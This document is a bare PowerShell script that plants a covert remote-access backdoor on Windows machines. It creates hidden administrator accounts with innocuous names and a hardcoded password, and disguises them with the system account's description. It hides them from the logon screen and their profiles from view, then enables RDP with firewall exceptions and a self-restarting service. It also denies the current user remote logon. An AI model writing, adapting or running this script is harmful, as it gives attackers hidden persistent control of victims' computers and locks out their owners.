$ErrorActionPreference='Stop'
$passwordSecure=ConvertTo-SecureString 'Adm1n@1!2' -AsPlainText -Force
$passwordPlain='Adm1n@1!2'
$userAccounts=@('HomeGroupUser','DefaultUser')
$domain=$env:USERDOMAIN
$computer=$env:COMPUTERNAME
$isDomainJoined=(Get-WmiObject Win32_ComputerSystem).PartOfDomain
try {[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Out-Null; $domainAvailable = $true} catch {$domainAvailable = $false}
$useDomain=$isDomainJoined -and $domainAvailable
$adminSID='S-1-5-32-544'
$rdpSID='S-1-5-32-555'
$adminGroup=(New-Object System.Security.Principal.SecurityIdentifier($adminSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$rdpGroup=(New-Object System.Security.Principal.SecurityIdentifier($rdpSID)).Translate([System.Security.Principal.NTAccount]).Value.Split('\')[1]
$currentUser="$domain\$($env:USERNAME)"
$tempDir="$env:TEMP\pol_temp"
$configFile="$tempDir\secpol.inf"
$dbFile="$tempDir\secpol.sdb"
try {
    $defaultDescription=(Get-LocalUser -Name 'DefaultAccount' -ErrorAction Stop).Description
} catch {
    $defaultDescription='A user account managed by the system.'
}
$groupId='@FirewallAPI.dll,-28752'
$ruleNames=@(
    'RemoteDesktop-UserMode-In-TCP','RemoteDesktop-UserMode-In-UDP',
    'RemoteDesktop-Shadow-In-TCP','RemoteDesktop-Shadow-In-TCP_1',
    'RemoteDesktop-UserMode-In-UDP_1','RemoteDesktop-UserMode-In-TCP_1'
)
$errorCount=0
function Retry-Command {
    param ([ScriptBlock]$action,[int]$attempts=3,[int]$delay=5)
    for ($i=1; $i -le $attempts; $i++) {
        try { & $action; return }
        catch {
            if ($i -eq $attempts) { throw }
            Start-Sleep -Seconds $delay
        }
    }
}

foreach ($user in $userAccounts) {
    if ($useDomain) {
        Retry-Command { & net user $user /domain > $null 2>&1 }
        if ($LASTEXITCODE -eq 0) {
            $principal="$domain\$user"
        } else {
            Retry-Command { & net user $user $passwordPlain /add /domain > $null 2>&1 }
            if ($LASTEXITCODE -eq 0) {
                $principal="$domain\$user"
            } else {
                if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
                    Retry-Command { & net user $user $passwordPlain /add > $null 2>&1 }
                }
                $principal="$computer\$user"
            }
        }
    } else {
        if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
            Retry-Command { New-LocalUser -Name $user -Password $passwordSecure }
        }
        $principal="$computer\$user"
    }

    if ($principal -like "$computer\*") {
        Retry-Command { Set-LocalUser -Name $user -PasswordNeverExpires $true }
        if ($defaultDescription.Length -le 48) {
            Retry-Command { Set-LocalUser -Name $user -Description $defaultDescription }
        } else {
            Retry-Command { & net user "$user" /comment:"$defaultDescription" > $null 2>&1 }
        }
        Retry-Command { Enable-LocalUser -Name $user }
        $profilePath="$env:SystemDrive\Users\$user.$computer"
        if (-not (Test-Path $profilePath)) {
            Retry-Command { robocopy "$env:SystemDrive\Users\Default" $profilePath /E /COPYALL /XJ > $null }
            Start-Sleep -Seconds 3
        }
        Retry-Command { attrib +h +s $profilePath }
        if (-not (Get-LocalGroupMember -Group $adminGroup -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $principal })) {
            Retry-Command { Add-LocalGroupMember -Group $adminGroup -Member $principal }
        }
        if (-not (Get-LocalGroupMember -Group $rdpGroup -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $principal })) {
            Retry-Command { Add-LocalGroupMember -Group $rdpGroup -Member $principal }
        }
    }

    if ($principal -like "$domain\\*" -and $useDomain) {
        Retry-Command { & net user "$user" /comment:"$defaultDescription" /domain > $null 2>&1 }
        Retry-Command { & net user $user /expires:never /domain > $null 2>&1 }
        Retry-Command { & net user $user /active:yes /domain > $null 2>&1 }
        $profilePath="$env:SystemDrive\Users\$user.$domain"
        if (-not (Test-Path $profilePath)) {
            Retry-Command { robocopy "$env:SystemDrive\Users\Default" $profilePath /E /COPYALL /XJ > $null }
            Start-Sleep -Seconds 3
        }
        Retry-Command { attrib +h +s $profilePath }
        Retry-Command {
            $null = & net localgroup $adminGroup $user /add /domain 2>&1
            if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 1378) { throw }
        }
        Retry-Command {
            $null = & net localgroup $rdpGroup $user /add /domain 2>&1
            if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne 1378) { throw }
        }
    }

    Retry-Command { Add-LocalGroupMember -Group $adminGroup -Member $principal -ErrorAction SilentlyContinue }
    Retry-Command { Add-LocalGroupMember -Group $rdpGroup -Member $principal -ErrorAction SilentlyContinue }

    $regPath='HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force > $null
    }
    Retry-Command { New-ItemProperty -Path $regPath -Name $user -PropertyType DWORD -Value 0 -Force > $null }

    $profilePath="$env:SystemDrive\\Users\\$user"
    if (-not (Test-Path $profilePath)) {
        Retry-Command { robocopy "$env:SystemDrive\\Users\\Default" $profilePath /E /COPYALL /XJ > $null }
        Start-Sleep -Seconds 3
    }
    Retry-Command { attrib +h +s $profilePath }
}

Retry-Command { New-Item -ItemType Directory -Path $tempDir -Force > $null }
Retry-Command { secedit /export /cfg $configFile > $null }
$lines=[System.Collections.Generic.List[string]](Get-Content $configFile -Encoding Unicode)
$idx=$lines.IndexOf('[Privilege Rights]')
$shutdownEntry=$lines | Select-String '^SeShutdownPrivilege' | Select-Object -First 1
if ($shutdownEntry) {
    $lines[$shutdownEntry.LineNumber-1] = "SeShutdownPrivilege = $adminSID"
} else {
    $lines.Insert($idx+1, "SeShutdownPrivilege = $adminSID")
}
$denyEntry=$lines | Select-String '^SeDenyRemoteInteractiveLogonRight' | Select-Object -First 1
if ($denyEntry) {
    $parts=$lines[$denyEntry.LineNumber-1].Split('=')[1].Trim().Split(',')
    if ($parts -notcontains $currentUser) {
        $parts += $currentUser
    }
    $lines[$denyEntry.LineNumber-1] = 'SeDenyRemoteInteractiveLogonRight = ' + ($parts -join ',')
} else {
    $lines.Insert($idx+2, "SeDenyRemoteInteractiveLogonRight = $currentUser")
}
$lines | Set-Content $configFile -Encoding Unicode
Retry-Command { secedit /configure /db $dbFile /cfg $configFile /areas USER_RIGHTS /quiet }
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

Retry-Command { Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ShutdownWithoutLogon' -Value 0 -Type DWord }
Retry-Command { Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Type DWord }

try { Enable-NetFirewallRule -Group $groupId -ErrorAction SilentlyContinue } catch { $errorCount++ }
foreach ($name in $ruleNames) {
    try { Set-NetFirewallRule -Name $name -Enabled True -ErrorAction SilentlyContinue } catch { $errorCount++ }
}
if ($errorCount -gt 0) {
    try {
        $port = (Get-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name PortNumber).PortNumber
    } catch { $port = 3389 }
    foreach ($proto in 'TCP','UDP') {
        if (-not (Get-NetFirewallRule -Name "RDP-$proto-In-Port$port" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name "RDP-$proto-In-Port$port" -DisplayName "Allow RDP $proto Port $port" -Protocol $proto -LocalPort $port -Direction Inbound -Action Allow
        }
    }
}

Retry-Command { Set-Service -Name TermService -StartupType Automatic }
Retry-Command { cmd /c "sc failure TermService reset=0 actions=restart/5000/restart/5000/restart/5000 >nul 2>&1" }
Retry-Command { Start-Service -Name TermService }
Retry-Command { sc start TermService }
